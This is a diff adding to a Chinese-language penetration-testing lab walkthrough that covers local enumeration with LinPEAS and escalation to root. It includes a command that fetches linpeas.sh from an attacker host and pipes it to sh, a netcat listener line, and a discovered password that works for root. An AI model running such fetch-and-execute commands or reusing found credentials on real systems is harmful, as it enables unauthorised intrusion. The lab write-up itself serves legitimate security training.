@@ -90,19 +90,29 @@ nc -lvnp 1234
 
 ### 本地信息枚举
 
+上传LinPEAS.sh脚本，对目标进行本地信息收集，已发现可利用的提权漏洞：
 
+```bash
+// Kali本机准备好linpeas.sh脚本，并在所属目录下开启服务器
+python3 -m http.server
+// 在目标系统中，下载linpeas.sh到本地并且直接执行
+curl -L 192.168.45.172:8000/linpeas.sh |sh
+```
 
+<figure><img src="../.gitbook/assets/16 (2).png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../.gitbook/assets/17 (2).png" alt=""><figcaption></figcaption></figure>
 
 ### 漏洞利用
 
+阅读linpeas.sh脚本的输出结果后，发现一个密码：<mark style="color:red;">**FatPanda123**</mark>
 
+<figure><img src="../.gitbook/assets/18 (2).png" alt=""><figcaption></figcaption></figure>
 
-
+并且已知当前系统上有两个用户账户：offsec和root，分别尝试后发现它是root账户的密码。
 
 ### ROOT
 
+<figure><img src="../.gitbook/assets/19 (2).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
+<figure><img src="../.gitbook/assets/20.png" alt=""><figcaption></figcaption></figure>
